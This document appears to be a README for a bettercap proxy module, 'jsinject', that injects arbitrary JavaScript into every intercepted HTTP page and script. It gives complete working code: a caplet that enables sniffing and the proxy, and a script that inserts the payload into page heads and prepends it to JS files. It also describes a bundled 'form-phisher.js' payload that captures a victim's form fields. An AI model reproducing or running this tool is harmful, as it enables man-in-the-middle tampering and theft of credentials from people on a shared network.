### JS-INJECT

A simple yet powerful proxy module that lets you inject your JavaScript payloads into any HTTP web page/application.

It prevents re-initiation of your script when it's already active in the DOM by declaring your payload as a unique function variable, and in some cases ignores the `X-Content-Type-Options: nosniff` header by checking for both `Content-Type` headers and file extensions.

All you have to do is set your payload path in the caplet file.

**caplets/jsinject/jsinject.cap**

```sh
# Set the path to your JavaScript payload
set jsinject.payload caplets/jsinject/payloads/form-phisher.js

set http.proxy.script caplets/jsinject/jsinject.js
set net.sniff.verbose false
net.sniff on
http.proxy on
```

**caplets/jsinject/jsinject.js**

```javascript
var session_id,
    payload,
    payload_path,
    payload_container = "" + 
    	"if (!self.{{session_id}}) {\n" + 
    		"var {{session_id}} = function() {\n" + 
    			"{{payload}}\n" + 
    		"}\n" + 
    		"{{session_id}}();\n" + 
    	"}\n"

var green = "\033[32m",
    bold  = "\033[1;37m",
    reset = "\033[0m"

function randomString(length) {
	var chars  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
	    buffer = ""
	while (buffer.length < length) {
		index = parseInt( Math.random() * chars.length )
		buffer = buffer + chars.charAt(index)
	}
	return buffer
}

function configure() {
	payload_path = env("jsinject.payload").replace(/\s*/g, "")
	payload = readFile(payload_path)
	payload = payload_container.replace("{{payload}}", payload).replace(/\{\{session_id\}\}/g, session_id)
}

function onLoad() {
	session_id = randomString( 4 + parseInt( Math.random() * 16 ) )
	configure()
	log_info(green + "jsinject" + reset + " started injecting payload " + bold + payload_path + reset + " into HTTP traffic.")
	log_info(green + "jsinject" + reset + " session ID is " + bold + session_id + reset + ".")
}

function onResponse(req, res) {
	configure()
	if ( res.ContentType.match(/^text\/html/i) || req.Path.replace(/\?.*/i, "").match(/\.(htm|html)$/i) ) {
		res.ReadBody()
		log_debug("(" + green + "jsinject" + reset + ") attempting to inject HTML document in " + bold + req.Hostname + reset + " ...")
		res.Body = res.Body.replace(/<head>/i, "<head><script>" + payload + "</script>")
	}
	if ( res.ContentType.match(/^text\/javascript/i) || res.ContentType.match(/^application\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
		res.ReadBody()
		log_debug("(" + green + "jsinject" + reset + ") attempting to inject JS document in " + bold + req.Hostname + reset + " ...")
		res.Body = payload + res.Body
	}
}
```

<hr>

### Included payload

<b><a href="./payloads/form-phisher.js">form-phisher.js</a></b> is included, which will wait for the victim to press a key before binding to the enter key, mouse click, screen tap and submit events in order to phish all the fields. This can be useful when you want to sniff proxied forms that are submitted over HTTPS, don't use URL parameters, etc.
